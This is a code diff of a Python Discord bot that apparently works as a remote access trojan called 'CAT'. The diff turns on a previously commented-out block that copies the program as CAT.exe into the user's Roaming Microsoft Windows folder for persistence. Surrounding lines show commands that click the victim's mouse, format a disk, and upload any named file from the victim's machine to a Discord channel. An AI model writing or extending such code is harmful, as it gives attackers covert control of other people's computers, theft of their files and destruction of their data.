@@ -25,7 +25,7 @@ path = f'C:\\Users\\{win32api.GetUserName()}\\AppData\\Roaming\\Microsoft\\Windo
 
 @bot.event
 async def on_ready():
-    """try:
+    try:
 
         with open(path + 'CAT.exe', 'rb') as f:
             pass
@@ -36,7 +36,7 @@ async def on_ready():
             data = f.read()
         with open(path + 'CAT.exe', 'wb') as f:
             f.write(data)
-"""
+
     channel_start = bot.get_channel(config.channel)
     date = datetime.now()
 
@@ -64,7 +64,6 @@ async def on_ready():
     embed.set_author(name=bot.user.name, icon_url='https://i.imgur.com/YbYKL0F.png')
     await channel_start.send(embed=embed)
     await bot.change_presence(activity=discord.Game(f'Was stated in {date.hour}:{date.minute}'))
-    del x, y, minute, embed, hwid
 
 
 @bot.command()
@@ -79,7 +78,7 @@ async def click(ctx):
         pg.click()
         await ctx.send('**CAT:** Clicked!')
     except Exception as e:
-        await ctx.send(f'ERROR \n{e}')
+        await ctx.send(f'ERROR **{e}**')
 
 
 @bot.command()
@@ -179,7 +178,6 @@ async def disk_format(ctx, disk):
 async def copy(ctx, way):
     try:
         await ctx.send('Copied file:', file=discord.File(way))
-        del way
     except FileNotFoundError:
         await ctx.send('File not found!')
 
